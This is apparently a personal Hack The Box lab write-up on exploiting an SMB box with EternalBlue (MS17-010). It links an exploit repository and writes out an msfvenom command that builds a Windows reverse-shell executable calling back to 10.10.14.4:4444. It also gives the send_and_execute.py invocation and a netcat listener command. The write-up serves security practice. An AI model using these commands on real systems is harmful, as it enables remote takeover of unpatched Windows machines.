Tags: #htb, #hacking 
Related to: #practice, #htb, #write-up, #smb, #microsoft-ds, #eternal-blue
See also: 
Index: [[🗂️Index of HTB Writeups]] 

#### Nmap 
Script scan on ports open after full scan
![[Pasted image 20230614214220.png]]

#### Scanned for smb-vulns as it smb is very vulnerable

![[Pasted image 20230627124641.png]]

We can see two RCEs 

https://github.com/helviojunior/MS17-010

Exploit is here.

Create windows tcp reverse shell with msfvenom
 ```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > eternalblue.exe
```

use send and execute.py to send shell to system. `python send_and_execute.py <victim-ip> /path/to/eternalblue.exe    
`
Open a netcat listener for that before that. ``nc -nlvp 4444

Eternal blue gives root access in this sceneario

whoami exe is not available in this machine so use the steps as in this link
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit

